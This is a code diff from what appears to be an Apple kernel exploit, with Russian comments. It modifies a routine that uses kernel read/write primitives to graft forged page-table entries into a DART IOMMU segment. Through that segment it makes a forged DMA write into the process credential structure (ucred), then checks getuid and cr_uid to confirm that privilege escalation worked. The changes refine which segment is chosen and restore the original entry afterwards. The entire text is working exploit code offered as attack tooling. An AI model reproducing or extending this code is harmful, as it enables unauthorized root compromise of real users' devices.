@@ -7797,15 +7797,30 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 *(uint64_t *)(L1p + (uint64_t)ig[1] * 8) = (L2PA >> 4) | 1;
                 *(uint64_t *)(L2p + (uint64_t)ig[2] * 8) = (L3PA >> 4) | 1;
                 *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = ctl2PA | linkFlags;
-                // seg-структура с пустым L0[0]
-                uint64_t segVA = 0;
-                for (uint32_t i = 0; i < 8 && !segVA; i++) {
+                // 1.9.215: выбор сегмента — АКТИВНАЯ цепь (L0[0]≠0): DVA опа
+                // обслуживается ей (1.9.214: вся наша ветка цела, ctl2=0 — мы
+                // прививались в пустую неактивную, железо её не ходит). Оригинал
+                // сохраняем, restore после окна. Fallback — пустая.
+                uint64_t segVA = 0, segOrig = 0;
+                for (uint32_t i = 0; i < 8; i++) {
                     uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
                     if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
-                    if (early_kread64(s + (uint64_t)ig[0] * 8) == 0) segVA = s;
+                    uint64_t e0 = early_kread64(s + (uint64_t)ig[0] * 8);
+                    uint64_t bLo = early_kread64(s + 0x20), bHi = early_kread64(s + 0x28);
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] seg[%u]=%#llx L0[%u]=%#018llx bounds [%#llx..%#llx)",
+                              i, (unsigned long long)s, ig[0], (unsigned long long)e0,
+                              (unsigned long long)bLo, (unsigned long long)bHi]);
+                    if (!segVA && e0 && ((e0 << 4) & 0x0000FFFFFFFFC000ULL)) { segVA = s; segOrig = e0; }
                 }
-                kpNote(r, [NSString stringWithFormat:@"  [P7] segVA=%#llx L0[%u] — прививка link=%#018llx",
-                          (unsigned long long)segVA, ig[0], (unsigned long long)((L1PA >> 4) | 1)]);
+                if (!segVA) {   // fallback: пустая (как 1.9.213/214)
+                    for (uint32_t i = 0; i < 8 && !segVA; i++) {
+                        uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                        if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                        if (early_kread64(s + (uint64_t)ig[0] * 8) == 0) segVA = s;
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P7] segVA=%#llx L0[%u] orig=%#018llx — прививка link=%#018llx",
+                          (unsigned long long)segVA, ig[0], (unsigned long long)segOrig, (unsigned long long)((L1PA >> 4) | 1)]);
                 if (segVA) {
                     uint64_t l0slot = segVA + (uint64_t)ig[0] * 8;
                     early_kwrite64(l0slot, (L1PA >> 4) | 1);
@@ -7851,8 +7866,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [P7] ctl2 changed=%d — %@", ch2,
                                   ch2 ? @"★★★ GRAFT РАБОТАЕТ: DART прошёл по нашей ветке!" : @"ветка проигнорирована (TLB/инвалид)"]);
-                        // restore L0[0]=0 всегда
-                        early_kwrite64(l0slot, 0);
+                        // restore L0[0]=orig всегда (активная — её настоящий link, пустая — 0)
+                        early_kwrite64(l0slot, segOrig);
                         if (ch2) {
                             // ФОРЖ: L3[leaf] → ucredPA, src = payload
                             uint64_t prF2 = 0, roF2 = 0, ucF2 = 0;
@@ -7892,7 +7907,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 kpNote(r, [NSString stringWithFormat:@"  [P7-F] forge-submit kr=0x%x — DMA в ucred", fkr2]);
                                 usleep(400000);
                                 stopRace = YES;
-                                early_kwrite64(l0slot, 0);
+                                early_kwrite64(l0slot, segOrig);
                                 uid_t gu2 = getuid(); gid_t gg2 = getgid();
                                 uint32_t cru2 = (uint32_t)early_kread64(ucF2 + 0x18);
                                 kpNote(r, [NSString stringWithFormat:@"  [P7-F] getuid()=%u getgid()=%u cr_uid=%u", gu2, gg2, cru2]);
